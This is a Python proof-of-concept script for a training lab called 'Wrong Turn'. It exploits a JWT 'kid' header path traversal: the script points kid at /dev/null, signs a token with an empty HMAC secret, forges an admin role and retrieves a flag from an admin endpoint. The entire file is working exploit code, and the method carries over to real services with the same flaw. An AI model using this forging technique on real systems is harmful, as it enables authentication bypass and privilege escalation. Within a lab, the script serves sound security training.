#!/usr/bin/env python3
"""
Lab #5 - Wrong Turn
Vulnerability : kid header used as a file path without sanitization
Attack        : set kid to ../../../../../../dev/null, sign with empty HMAC secret
"""
import argparse, base64, hashlib, hmac, json, sys
import requests
from pwn import log


def parse_args():
    p = argparse.ArgumentParser(description='Lab #5 - Wrong Turn PoC')
    p.add_argument('--url', default='http://localhost:3000', metavar='URL',
                   help='target base URL (default: http://localhost:3000)')
    return p.parse_args()


def b64url_enc(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def forge_token(payload: dict, kid: str, secret: bytes) -> str:
    h = b64url_enc(json.dumps({'alg': 'HS256', 'typ': 'JWT', 'kid': kid}, separators=(',', ':')).encode())
    p = b64url_enc(json.dumps(payload, separators=(',', ':')).encode())
    sig = b64url_enc(hmac.new(secret, f'{h}.{p}'.encode(), hashlib.sha256).digest())
    return f'{h}.{p}.{sig}'


def main():
    args = parse_args()
    base_url = args.url.rstrip('/')

    log.info(f'Target: {base_url}')

    r = requests.post(f'{base_url}/api/login', json={'username': 'alice'}, timeout=5)
    r.raise_for_status()
    log.success(f'Token: {r.cookies["session"][:60]}...')

    kid    = '../../../../../../dev/null'
    secret = b''
    log.info(f'Traversal: kid -> {kid}')
    log.info('Server reads /dev/null (empty) -> HMAC key = empty bytes')

    forged = forge_token({'name': 'hacker', 'role': 'admin'}, kid, secret)
    log.info(f'Forged token: {forged[:72]}...')

    r = requests.get(f'{base_url}/api/admin/alerts', cookies={'session': forged}, timeout=5)
    if r.status_code != 200:
        log.failure(f'Status {r.status_code}: {r.text}')
        sys.exit(1)

    log.success(f'FLAG: {r.json()["flag"]}')


if __name__ == '__main__':
    main()
